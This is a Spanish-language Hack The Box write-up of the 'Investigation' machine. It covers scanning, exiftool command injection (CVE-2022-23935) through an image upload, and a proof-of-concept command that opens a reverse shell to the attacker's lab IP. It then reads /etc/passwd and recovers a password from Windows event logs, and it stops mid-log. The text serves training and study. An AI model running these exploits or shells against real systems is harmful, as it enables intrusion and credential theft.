<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-investigation-writeup">Hack The Box: Investigation Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Investigation&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.228.203 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.228.203 -&gt; <span style="color:#f92672">[</span>22,80<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80 -sCV 10.129.228.203 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-13 23:07 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.203
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://eforenzics.htb/
</span></span><span style="display:flex;"><span>Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.65 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.228.203 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-13 23:08 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.203
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1494</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>22381/udp closed unknown
</span></span><span style="display:flex;"><span>23965/udp closed unknown
</span></span><span style="display:flex;"><span>24910/udp closed unknown
</span></span><span style="display:flex;"><span>26289/udp closed unknown
</span></span><span style="display:flex;"><span>28645/udp closed unknown
</span></span><span style="display:flex;"><span>31412/udp closed unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.81 seconds
</span></span></code></pre></div><p>Solo vemos el puerto 80/TCP como posible vector de ataque, en el anterior escaneo hemos detectado el dominio <code>eforenzics.htb</code> así que lo añadimos al <code>/etc/hosts</code></p>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://eforenzics.htb
</span></span><span style="display:flex;"><span>http://eforenzics.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.41<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.228.203<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>3.4.1<span style="color:#f92672">]</span>, Meta-Author<span style="color:#f92672">[</span>eForenzics<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>eForenzics - Premier Digital Forensics<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>upgrade<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Por ahora parece que no existe ningún CMS por detrás.</p>
<p>El sitio web se ve así.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Podemos ver algunas valoraciones, nos vamos a apuntar estos usuarios por si acaso.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>En el recurso <code>service.html</code> podemos ver un formulario de subida de archivo
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Se apunta al recurso <code>upload.php</code>
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Nos pide que subamos una imagen <code>jpg</code></p>
<blockquote>
<p>Upload an image file and we will provide a detailed forensic analysis.
At this time we can only process jpg images.</p>
</blockquote>
<p>Si subimos una imagen nos redirecciona a <code>http://eforenzics.htb/analysed_images/testjpg.txt</code>
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Vemos que se está utilizando <code>exiftool</code>
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<h1 id="foothold---cve-2022-23935">Foothold -&gt; CVE-2022-23935</h1>
<p>Podemos intentar inyectar un comando modificando el <code>filename</code> pero esto no funciona.
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Buscando exploits encontramos algunos que nos llama la atención.
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Recordemos que la versión era la <code>12.37</code></p>
<p>Podemos utilizar <a href="https://github.com/cowsecurity/CVE-2022-23935">este PoC</a></p>
<p>Este PoC automáticamente se pone en escucha por el puerto 443 pero podemos generar el payload y luego ponernos nosotros en escucha con <code>pwncat-cs</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo python3 CVE-2022-23935.py 10.10.14.85 <span style="color:#ae81ff">443</span>
</span></span></code></pre></div><p>Subimos el archivo que genera.
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>¡Y ganamos acceso!
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Ahora nos salimos de esa shell, nos ponemos en escucha con <code>pwncat-cs</code> por el puerto 443 y subimos otra vez el archivo.</p>
<p><img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<h1 id="user-pivoting">User Pivoting</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@investigation:/var/www/html$ cat /etc/passwd | grep bash
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
</span></span></code></pre></div><p>Vemos que solo existe el usuario <code>smorton</code> a parte de <code>root</code></p>
<p>Encontramos un archivo de este usuario un tanto extraño</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@investigation:/home$ find / -type f -user smorton 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/local/investigation/Windows Event Logs <span style="color:#66d9ef">for</span> Analysis.msg
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@investigation:/usr/local/investigation$ file Windows<span style="color:#ae81ff">\ </span>Event<span style="color:#ae81ff">\ </span>Logs<span style="color:#ae81ff">\ </span><span style="color:#66d9ef">for</span><span style="color:#ae81ff">\ </span>Analysis.msg 
</span></span><span style="display:flex;"><span>Windows Event Logs <span style="color:#66d9ef">for</span> Analysis.msg: CDFV2 Microsoft Outlook Message
</span></span></code></pre></div><p>Un archivo con la extensión <code>.msg</code> es un archivo de mensaje utilizado principalmente por Microsoft Outlook y otras aplicaciones de correo electrónico que son compatibles con el formato de Microsoft Outlook.</p>
<p>Es decir, viendo su peso (1,3M) contiene mensajes de correo, quizás alguno sea interesante.</p>
<p>Este es un archivo en formato MS-Outlook pero podemos convertirlo en un archivo .eml.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt-get install libemail-outlook-message-perl libemail-sender-perl
</span></span></code></pre></div><p>Convertimos el archivo&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msgconvert msg.msg 
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/investigation/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ ls
</span></span><span style="display:flex;"><span>msg.eml  msg.msg  test.jpg
</span></span></code></pre></div><p>Podemos analizar el archivo eml con <a href="https://www.encryptomatic.com/viewer/">encryptomatic</a> y vemos un mensaje sobre que se debe analizar unos logs.
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>El archivo zip contiene un archivo <code>security.evtx</code>
<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p>Este archivo <code>.evtx</code> es un archivo de registro de eventos de Windows para almacenar eventos de registro del sistema y aplicaciones.</p>
<p>Podemos leer este archivo con <a href="https://github.com/omerbenamram/evtx">https://github.com/omerbenamram/evtx</a></p>
<p>Nos descargamos la herramienta de <a href="https://github.com/omerbenamram/evtx/releases/download/v0.8.3/evtx_dump-v0.8.3-x86_64-unknown-linux-gnu">aquí</a></p>
<p>Y guiándonos con este artículo
<a href="https://medium.com/@salim.y.salimov/a-hassle-free-evtx-to-json-converter-not-only-for-windows-but-linux-and-mac-os-too-82adc4d9d158">https://medium.com/@salim.y.salimov/a-hassle-free-evtx-to-json-converter-not-only-for-windows-but-linux-and-mac-os-too-82adc4d9d158</a></p>
<p>Ahora podemos convertir el archivo evtx a un formato json</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./evtx -o json -f security.json security.evtx
</span></span></code></pre></div><p>Y ya podemos analizarlo tranquilamente&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat security.json | head -n <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>Record <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Event&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;xmlns&#34;</span>: <span style="color:#e6db74">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;System&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Provider&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;Microsoft-Windows-Eventlog&#34;</span>,
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Consultando la <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics">biblia del hacking (HackTricks)</a></p>
<p>Encontramos el formato de este log y encontramos lo que significa los identificadores de los IDs
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Realmente los logs mas importantes relacionados con la autenticación de los usuarios son los que he marcado.</p>
<p>Si revisamos el evento <code>4624</code> no encontramos nada pero si revisamos el evento <code>4625</code>&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat security.json | grep <span style="color:#e6db74">&#34;: 4625&#34;</span> -C <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;PackageName&#34;</span>: <span style="color:#e6db74">&#34;MICROSOFT_AUTHENTICATION_PACKAGE_V1_0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;TargetUserName&#34;</span>: <span style="color:#e6db74">&#34;lmonroe&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Workstation&#34;</span>: <span style="color:#e6db74">&#34;EFORENZICS-DI&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Status&#34;</span>: <span style="color:#e6db74">&#34;0xc000006a&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>Record <span style="color:#ae81ff">7985</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Event&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;xmlns&#34;</span>: <span style="color:#e6db74">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;System&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Provider&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;Microsoft-Windows-Security-Auditing&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Guid&#34;</span>: <span style="color:#e6db74">&#34;54849625-5478-4994-A5BA-3E3B0328C30D&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;EventID&#34;</span>: 4625,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Version&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Level&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Task&#34;</span>: 12544,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Keywords&#34;</span>: <span style="color:#e6db74">&#34;0x8010000000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;TimeCreated&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;SystemTime&#34;</span>: <span style="color:#e6db74">&#34;2022-08-01T16:34:51.543729Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;EventRecordID&#34;</span>: 11371170,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Correlation&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ActivityID&#34;</span>: <span style="color:#e6db74">&#34;6A946884-A5BC-0001-D968-946ABCA5D801&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Execution&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ProcessID&#34;</span>: 628,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ThreadID&#34;</span>: <span style="color:#ae81ff">5128</span>
</span></span><span style="display:flex;"><span>--
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;PackageName&#34;</span>: <span style="color:#e6db74">&#34;MICROSOFT_AUTHENTICATION_PACKAGE_V1_0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;TargetUserName&#34;</span>: <span style="color:#e6db74">&#34;hmraley&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Workstation&#34;</span>: <span style="color:#e6db74">&#34;EFORENZICS-DI&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Status&#34;</span>: <span style="color:#e6db74">&#34;0xc0000064&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>Record <span style="color:#ae81ff">8418</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Event&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;xmlns&#34;</span>: <span style="color:#e6db74">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;System&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Provider&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;Microsoft-Windows-Security-Auditing&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Guid&#34;</span>: <span style="color:#e6db74">&#34;54849625-5478-4994-A5BA-3E3B0328C30D&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;EventID&#34;</span>: 4625,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Version&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Level&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Task&#34;</span>: 12544,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Keywords&#34;</span>: <span style="color:#e6db74">&#34;0x8010000000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;TimeCreated&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;SystemTime&#34;</span>: <span style="color:#e6db74">&#34;2022-08-01T16:50:07.137703Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;EventRecordID&#34;</span>: 11371603,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Correlation&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ActivityID&#34;</span>: <span style="color:#e6db74">&#34;6A946884-A5BC-0001-D968-946ABCA5D801&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Execution&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ProcessID&#34;</span>: 628,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ThreadID&#34;</span>: <span style="color:#ae81ff">604</span>
</span></span><span style="display:flex;"><span>--
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;PackageName&#34;</span>: <span style="color:#e6db74">&#34;MICROSOFT_AUTHENTICATION_PACKAGE_V1_0&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;TargetUserName&#34;</span>: <span style="color:#e6db74">&#34;Def@ultf0r3nz!csPa</span>$$<span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Workstation&#34;</span>: <span style="color:#e6db74">&#34;EFORENZICS-DI&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Status&#34;</span>: <span style="color:#e6db74">&#34;0xc0000064&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>Record <span style="color:#ae81ff">10146</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Event&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;xmlns&#34;</span>: <span style="color:#e6db74">&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;System&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Provider&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;Microsoft-Windows-Security-Auditing&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Guid&#34;</span>: <span style="color:#e6db74">&#34;54849625-5478-4994-A5BA-3E3B0328C30D&#34;</span>
